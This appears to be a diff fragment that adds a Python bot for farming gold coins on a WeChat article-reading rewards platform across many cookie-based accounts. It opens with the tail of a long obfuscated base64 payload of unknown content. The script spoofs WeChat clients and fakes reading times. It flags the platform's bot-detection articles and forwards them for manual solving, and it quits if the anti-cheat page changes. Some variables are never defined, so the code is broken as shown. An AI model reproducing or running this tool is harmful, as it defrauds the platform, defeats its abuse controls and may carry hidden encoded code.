/SpYuynbs5ZGkFIT+/xM0xCaejuPMapjQdEqng+AID/dwLkOgVPdLflIO2ch8Lotrzss3KZhWshNHW8bjYez3Sdb0XiK3hF2KGar1lBK+HlzifVNCc9t4kejAoiA6bvV56fpD+8aNsFTva17/pk+TbZrpXw+XsRWWXOWgWEmwMa6qZRP8uKe4nPKdZ32soQ55qx5WyYlXBWD7fWiASPWeBaUPjBa9RvW0W+BtdJm/fzH6p9CSisCk2t0YsQaxb6htwP2SwwVf91+XGwS3bbi/kRPVxabWU0jU+pGh8OjUbt+VfpHvarI+F7FDNbfADBJUsLblp0Jlb1Q1rlgI/WYfDXr9gWhZKOq/0boJuxE+t7CsnaAAGakwbvsjUh+jRLbJbuqWvY92pZnfOFc55tYPidiGKjtkA6YkUHRKzRZxUYL7YmElvnVvKm2wexumYGqmNt1nuCjnl+bDdRBCjlIj4nF238BKLH6akMHLfL4Y4rR5u1GLhmjYSmPMdMs2MnDKcQRjOfyHUmV5DB+hVUg6lczsnXH73XkWs7wt9RPECYCMPC7o3eRtuFWJjkhmAsrkj9hiCzfipQTycs9f8OvjB9mxogz4pttQYATdDkWn2XtEQLk9akxTmFpvAG0ttE1C4/MKXj2Jxt/0PFVcSD0XPMt1HxGN+p/l/MqxiA4iPcF+AXVC4pLsMKrp1AzBHiy7ZO+URd1HIAiOiLHfp9TQDYqpouBQY0ML45Fl8rA0xx1TlgXCTb/+LuSKcKEgT0yoFg=')))
+import threading
+import requests
+import time
+import os
+import re
+import random
+from urllib.parse import urlparse, parse_qs,quote
+import hashlib
+from concurrent.futures import ThreadPoolExecutor
+lock = threading.Lock()
+def printf(m):
+    with lock:
+        print(m)
+class yuanshen():
+    def __init__(self,cookie):
+        match = re.search(r'ysmuid=(.+)', cookie)
+        self.ysmuid = match.group(1) if match else ''
+        self.unionid = None
+
+        self.vs = "110"
+        self.list = "MzkxNTE3MzQ4MQ==,Mzg5MjM0MDEwNw==,MzUzODY4NzE2OQ==,MzkyMjE3MzYxMg==,MzkxNjMwNDIzOA==,Mzg4NTcwODE1NA==,MzIzMDczODg4Mw==,Mzg5ODUyMzYzMQ==,MzU0NzI5Mjc4OQ==,MzIzMDczODg4Mw==,MzkxNDU1NDEzNw==,MzkwMTYwNzcwMw==,MzkzNTYxOTgyMA==,MzkyNjY0MTExOA==,MzkxNDYzOTEyMw==,MzkyMjYxNzQ2NA==,MzkzNDYxODY5OA==,MzkzMTYyMDU0OQ==,MzkwNzYwNDYyMQ=="
+        self.list_ = self.list.split(',')
+        self.url = f"{int(time.time())}.dyrggt.cn"
+        self.h = {
+    "Host": f"{self.url}",
+    "Connection": "keep-alive",
+    "Accept": "application/json, text/javascript, */*; q=0.01",
+    "X-Requested-With": "XMLHttpRequest",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 13; 23054RA19C Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 MMWEBID/98 MicroMessenger/8.0.49.2600(0x28003133) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
+    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+    "Origin": f"http://{self.url}",
+    "Referer": f"http://{self.url}/",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
+    "Cookie": f"ysmuid={self.ysmuid}; ejectCode=1"
+}       
+        
+
+
+    def getunionid(self):
+        def domain_url(url):
+            parsed_url = urlparse(url)
+            domain = parsed_url.netloc
+            return domain
+        url = "http://057c0b04032256d679.byexj.shop/yunonline/v1/auth/1ddf953f568a15fc1d498ae264bb6925?codeurl=byexj.shop&codeuserid=2&time=1712156161"
+        headers = {
+            "Host": "057c0b04032256d679.byexj.shop",
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 13; 23054RA19C Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 MMWEBID/98 MicroMessenger/8.0.49.2600(0x28003133) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/wxpic,image/tpg,image/webp,"
+                    "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "x-requested-with": "com.tencent.mm",
+            "sec-fetch-site": "cross-site",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-user": "?1",
+            "sec-fetch-dest": "document",
+            "referer": "https://weixin110.qq.com/",
+            "accept-encoding": "gzip, deflate",
+            "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+        }
+        response = requests.get(url, headers=headers, allow_redirects=False, verify=False).headers.get("location")
+        headers = {
+            "Host": domain_url(response),
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 13; 23054RA19C Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 MMWEBID/98 MicroMessenger/8.0.49.2600(0x28003133) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/wxpic,image/tpg,image/webp,"
+                    "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "X-Requested-With": "com.tencent.mm",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Cookie": f"ysmuid={self.ysmuid}"
+        }
+        response = requests.get(response, headers=headers, allow_redirects=False).headers.get("location")
+        response = requests.get(response, headers=headers).text
+        unid = re.compile('websocket.send\("(.*?)"\);')
+        self.unionid = unid.findall(response)[0]
+        print("获取到unionid:",self.unionid)
+        
+
+
+    def tuisong(self):
+        # 发送消息到wxpusher
+        url = f"https://wxpusher.zjiecode.com/api/send/message/?appToken={appToken}&topicId={topicIds}&content=检测文章%0A请在20秒内完成验证!%0A%3Cbody+onload%3D%22window.location.href%3D%27{quote(self.readurl)}%27%22%3E"
+        r = requests.get(url).json()
+        printf(f"🎉️检测文章推送结果{r}")
+    
+    def fuck(self):
+        headers = {
+    "Host": f"{self.domain}",
+    "Connection": "keep-alive",
+    "Upgrade-Insecure-Requests": "1",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 13; 23054RA19C Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.120 Mobile Safari/537.36 XWEB/1220053 MMWEBSDK/20240404 MMWEBID/98 MicroMessenger/8.0.49.2600(0x28003133) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/wxpic,image/tpg,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+    "X-Requested-With": "com.tencent.mm",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+}
+        url = f"http://{self.domain}/kdf.html?uk={self.uk}&t={self.t}"
+        r = requests.get(url,headers=headers).text
+        md5 = hashlib.md5()
+        md5.update(r.encode('utf-8'))
+        j = md5.hexdigest()
+        printf(f"当前页面校准值:{j}")
+        if j != "aedb13d0ef22ac41a8c2f5c34cf2d093":
+            printf("当前页面校准值发生变化，疑似更改接口代码，马上跑路")
+            exit()
+
+    def getdomain(self):
+        url = f"http://{self.url}/wtmpdomain2"
+        data = {"unionid": f"{self.unionid}"}
+        r = requests.post(url,headers=self.h,data=data).json()
+        if r['errcode'] == 0:
+            j = urlparse(r['data']['domain'].replace('\\','')); 
+            self.domain, p = j.netloc, parse_qs(j.query); self.uk, self.t = p.get('uk')[0] if p.get('uk') else '', p.get('t')[0] if p.get('t') else ''
+            printf(f"获取阅读域名成功[{self.domain}][{self.uk}][{self.t}]")
+            self.h2 = {
+    "Host": f"{self.domain}",
+    "Connection": "keep-alive",
+    "Accept": "application/json, text/javascript, */*; q=0.01",
+    "User-Agent": "Mozilla/5.0 (Linux; Android 13; 23054RA19C Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 MMWEBID/98 MicroMessenger/8.0.49.2600(0x28003133) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64",
+    "X-Requested-With": "XMLHttpRequest",
+    "Referer": f"http://{self.domain}/kdf.html?uk={self.uk}&t={self.t}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
+}
+            if self.fuck():exit()   
+        else:
+            printf(f"获取阅读域名失败---[{r['msg']}]")
+            return True
+    
+    def read(self):
+            url = f"http://{self.domain}/dresger4x?uk={self.uk}&time={int(time.time() * 1000)}&psgn=168&vs={self.vs}"
+            r = requests.get(url,headers=self.h2).json()
+            if r['errcode'] == 0:
+                self.readurl = r['data']['link']
+                printf(f"获取阅读文章成功[{self.readurl}]")
+                j = urlparse(self.readurl.replace('\\',''))
+                biz = parse_qs(j.query).get('__biz', [''])[0] if '__biz' in parse_qs(j.query) else ''
+                if biz in self.list_:
+                    printf("遇到检测文章，推送ing...")
+                    self.tuisong()
+                    k = random.randint(20,25)
+                    time.sleep(k)
+                else:
+                    k = random.randint(8,16)
+                    time.sleep(k)
+                url = f"http://{self.domain}/jinbicp?uk={self.uk}&time={k}&timestamp={int(time.time() * 1000)}"
+                r = requests.get(url,headers=self.h2).json()
+                if r['errcode'] == 0:
+                    printf(f"阅读成功,获得[{r['data']['gold']}]金币,今日共获得金币[{r['data']['day_gold']}]")
+                    if r['data']['day_gold'] >= MAX_gold:
+                        return True
+                else:
+                    printf(f"阅读失败---[{r['msg']}]")
+                    return True
+            else:
+                printf(f"获取阅读文章失败---[{r['msg']}]")
+                return True
+            
+
+    def userinfo(self):
+        url = f"http://{self.url}/yunonline/v1/gold?unionid={self.unionid}&time={int(time.time() * 1000)}"
+        r = requests.get(url,headers=self.h).json()
+        if r['errcode'] == 0:
+            printf(f"用户金币[{r['data']['last_gold']}],今日已阅读[{r['data']['day_read']}]")
+            #提现部分 待补充
+        else:
+            printf(f"用户信息获取失败---[{r['msg']}]")
+
+
+    
+    def main(self):
+        self.getunionid()
+        if self.getdomain():exit()
+        while True:
+                if self.read():break
+                time.sleep(3)
+        self.userinfo()
+
+if __name__ == '__main__':
+    appToken = ""
+    topicIds = ""
+
+    if not appToken:
+        appToken = os.getenv("yuanshen_apptoken")
+        if not appToken:
+            printf("❌你还没有设置推送,请设置环境变量:yuanshen_apptoken")
+            exit()
+    if not topicIds:
+        topicIds = os.getenv("yuanshen_topicid")
+        if not topicIds:
+            printf("❌你还没有设置推送,请设置环境变量:yuanshen_topicid")
+            exit()
+
+    cookie = ''
+    if not cookie:
+        cookie = os.getenv("yuanshen_xyy")
+        if not cookie:
+            printf("❌你还没有设置阅读ck,请设置环境变量:yuanshen_xyy")
+            exit()
+    cookies = cookie.split("@")
+    print(f"一共获取到{len(cookies)}个账号")
+    tasks = []
+    for ck in cookies:
+        task = yuanshen(ck)
+        tasks.append(task)
+
+    
+
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        time.sleep(3)
+        results = executor.map(lambda task: task.main(), tasks)
+
+    print("所有任务执行完毕")
